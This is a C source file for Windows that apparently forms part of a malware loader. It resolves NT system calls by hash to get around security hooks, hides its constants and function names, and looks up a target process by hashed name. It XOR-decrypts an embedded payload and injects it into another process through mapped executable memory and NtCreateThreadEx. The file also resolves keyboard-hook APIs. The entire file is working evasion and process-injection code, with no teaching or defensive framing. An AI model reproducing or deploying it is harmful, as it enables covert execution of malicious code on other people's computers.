
#include "common.h"
#include "debug.h"
#include "structs.h"
#include <stddef.h>
#include <windows.h>

VX_TABLE g_Sys = {0};
API_HASHING g_Api = {0};

const unsigned char thekeytothecity[] = {0xbe, 0xba, 0xfe, 0xca,
                                         0xef, 0xbe, 0xad, 0xde};
const size_t thekeytothecity_len = sizeof(thekeytothecity);

typedef struct _TheBuild {
  DWORD user_spacename;
  DWORD kernel_spacename;
  DWORD section_maker;
  DWORD section_mapviewer;
  DWORD section_unmapviewer;
  DWORD closer;
  DWORD thread_maker;
  DWORD waiter;
} _TheBuild;

// 2) One function that computes them all at once
static inline _TheBuild BuildTheDragon(void) {
  _TheBuild h;

  const DWORD A = 0x11223344, B = A ^ 0x349D72E7;
  h.user_spacename = A ^ B;

  const DWORD C = 0x15221329, D = C ^ 0xFD2AD9BD;
  h.kernel_spacename = C ^ D;

  const DWORD E = 0x96228369;
  h.section_maker = E ^ (E ^ 0x192C02CE);
  h.section_mapviewer = E ^ (E ^ 0x91436663);
  h.section_unmapviewer = E ^ (E ^ 0x0A5B9402);
  h.closer = E ^ (E ^ 0x369BD981);
  h.thread_maker = E ^ (E ^ 0x8EC0B84A);
  h.waiter = E ^ (E ^ 0x6299AD3D);

  return h;
}

BOOL Thebadmaninitialize() {

  PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
  PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
  if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
    return FALSE;

  _TheBuild h = BuildTheDragon();

  PLDR_DATA_TABLE_ENTRY pLdrDataEntry =
      (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList
                                  .Flink->Flink -
                              0x10);

  PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
  if (!GetImageExportDirectory(pLdrDataEntry->DllBase,
                               &pImageExportDirectory) ||
      pImageExportDirectory == NULL)
    return FALSE;

  g_Sys.NtCreateSection.uHash = h.section_maker;
  g_Sys.NtMapViewOfSection.uHash = h.section_mapviewer;
  g_Sys.NtUnmapViewOfSection.uHash = h.section_unmapviewer;
  g_Sys.NtClose.uHash = h.closer;
  g_Sys.NtCreateThreadEx.uHash = h.thread_maker;
  g_Sys.NtWaitForSingleObject.uHash = h.waiter;
  g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
  g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtCreateSection))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtMapViewOfSection))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtUnmapViewOfSection))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtClose))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtCreateThreadEx))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtWaitForSingleObject))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtQuerySystemInformation))
    return FALSE;
  if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                       &g_Sys.NtDelayExecution))
    return FALSE;

  g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(
      GetModuleHandleH(h.user_spacename), CallNextHookEx_JOAA);
  g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(
      GetModuleHandleH(h.user_spacename), DefWindowProcW_JOAA);
  g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(
      GetModuleHandleH(h.user_spacename), GetMessageW_JOAA);
  g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(
      GetModuleHandleH(h.user_spacename), SetWindowsHookExW_JOAA);
  g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(
      GetModuleHandleH(h.user_spacename), UnhookWindowsHookEx_JOAA);

  if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL ||
      g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL ||
      g_Api.pUnhookWindowsHookEx == NULL)
    return FALSE;

  g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(
      GetModuleHandleH(h.kernel_spacename), GetModuleFileNameW_JOAA);
  g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(
      GetModuleHandleH(h.kernel_spacename), CloseHandle_JOAA);
  g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(
      GetModuleHandleH(h.kernel_spacename), CreateFileW_JOAA);
  g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(
      GetModuleHandleH(h.kernel_spacename), GetTickCount64_JOAA);
  g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(
      GetModuleHandleH(h.kernel_spacename), OpenProcess_JOAA);
  g_Api.pSetFileInformationByHandle =
      (fnSetFileInformationByHandle)GetProcAddressH(
          GetModuleHandleH(h.kernel_spacename),
          SetFileInformationByHandle_JOAA);

  if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL ||
      g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL ||
      g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
    return FALSE;

  return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD *pdwPid,
                            IN HANDLE *phProcess) {

  ULONG uReturnLen1 = 0, uReturnLen2 = 0;
  PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
  PVOID pValueToFree = NULL;
  NTSTATUS STATUS = 0;

  TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
  TheFlagOfWudan(SystemProcessInformation, NULL, NULL, &uReturnLen1);

  SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(
      GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
  if (SystemProcInfo == NULL) {
    return FALSE;
  }

  pValueToFree = SystemProcInfo;

  TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
  STATUS = TheFlagOfWudan(SystemProcessInformation, SystemProcInfo, uReturnLen1,
                          &uReturnLen2);

  while (TRUE) {

    if (SystemProcInfo->ImageName.Length &&
        HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {

      *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
      *phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE,
                                      (DWORD)SystemProcInfo->UniqueProcessId);
      break;
    }

    if (!SystemProcInfo->NextEntryOffset)
      break;

    SystemProcInfo =
        (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo +
                                      SystemProcInfo->NextEntryOffset);
  }

  HeapFree(GetProcessHeap(), 0, pValueToFree);

  if (*pdwPid == NULL || *phProcess == NULL)
    return FALSE;
  else
    return TRUE;
}

void TakeAllTrilliare(unsigned char *data, size_t len) {
  for (size_t i = 0; i < len; i++) {
    size_t pos = i % thekeytothecity_len;
    unsigned char real_key = thekeytothecity[thekeytothecity_len - 1 - pos];
    unsigned char plain = data[i] ^ real_key;

    if ((i ^ 0x37) & 1) {
      data[i] = plain ^ 0x5A;
      data[i] ^= 0x5A;
    } else {
      data[i] = plain;
      unsigned char tmp = data[i] ^ 0xA7;
      data[i] = tmp ^ 0xA7;
    }
  }
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload,
                                       IN SIZE_T sPayloadSize, IN BOOL bLocal) {

  HANDLE hSection = NULL;
  HANDLE hThread = NULL;
  PVOID pLocalAddress = NULL, pRemoteAddress = NULL, pExecAddress = NULL;
  NTSTATUS STATUS = 0;
  SIZE_T sViewSize = 0;
  LARGE_INTEGER MaximumSize = {.HighPart = 0, .LowPart = sPayloadSize};

  DWORD dwLocalFlag = PAGE_READWRITE;

  TheDogHouse(g_Sys.NtCreateSection.wSystemCall);
  TheFlagOfWudan(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize,
                 PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  if (bLocal) {
    dwLocalFlag = PAGE_EXECUTE_READWRITE;
  }

  TheDogHouse(g_Sys.NtMapViewOfSection.wSystemCall);
  TheFlagOfWudan(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL,
                 &sViewSize, ViewShare, NULL, dwLocalFlag);

  _memcpy(pLocalAddress, pPayload, sPayloadSize);

  TakeAllTrilliare((unsigned char *)pLocalAddress, sPayloadSize);

  PRINTA("[i] First 16 bytes of fun game:");
  for (int i = 0; i < 16; i++) {
    PRINTA("0x%02X ", ((BYTE *)pLocalAddress)[i]);
  }
  PRINTA("");

  if (!bLocal) {
    TheDogHouse(g_Sys.NtMapViewOfSection.wSystemCall);
    TheFlagOfWudan(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL,
                   &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
  }

  pExecAddress = pRemoteAddress;
  if (bLocal) {
    pExecAddress = pLocalAddress;
  }

  TheDogHouse(g_Sys.NtCreateThreadEx.wSystemCall);
  if ((STATUS = TheFlagOfWudan(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                               pExecAddress, NULL, NULL, NULL, NULL, NULL,
                               NULL)) != 0) {
#ifdef DEBUG
    // PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X", STATUS);
#endif // DEBUG
    return FALSE;
  }

  TheDogHouse(g_Sys.NtWaitForSingleObject.wSystemCall);
  TheFlagOfWudan(hThread, FALSE, NULL);

  TheDogHouse(g_Sys.NtUnmapViewOfSection.wSystemCall);
  TheFlagOfWudan((HANDLE)-1, pLocalAddress);

  TheDogHouse(g_Sys.NtClose.wSystemCall);
  TheFlagOfWudan(hSection);

  return TRUE;
}
